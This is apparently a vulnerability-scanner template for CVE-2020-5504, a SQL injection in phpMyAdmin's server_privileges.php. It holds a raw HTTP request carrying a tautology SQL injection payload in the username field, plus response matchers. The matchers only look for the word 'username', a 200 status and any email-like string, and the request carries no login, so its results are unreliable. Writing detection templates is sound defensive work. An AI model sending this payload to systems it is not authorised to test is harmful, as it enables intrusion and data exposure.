id: cve-2020-5504
info:
  name: phpMyAdmin 5.0.0 SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    phpMyAdmin 5.0.0 is vulnerable to SQL injection via the `server_privileges.php` endpoint. An attacker must have a valid MySQL account to exploit this issue.
  reference:
    - https://github.com/phpmyadmin/phpmyadmin/
    - https://exploit-db.com/exploits/52451
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5504
  tags: edb,sql-injection,phpmyadmin,cve

http:
  - raw:
      - |
        GET /server_privileges.php?ajax_request=true&validate_username=set&username=%27%20OR%20%271%27%3D%271%27%20--%20 HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "username" # Validate the response includes the parameter name
        part: body
      - type: status
        status: 
          - 200
      - type: regex
        regex:
          - "[a-zA-Z_]+@[a-zA-Z_]+\\.[a-zA-Z]{2,}" # Check for presence of any email-like strings in the response
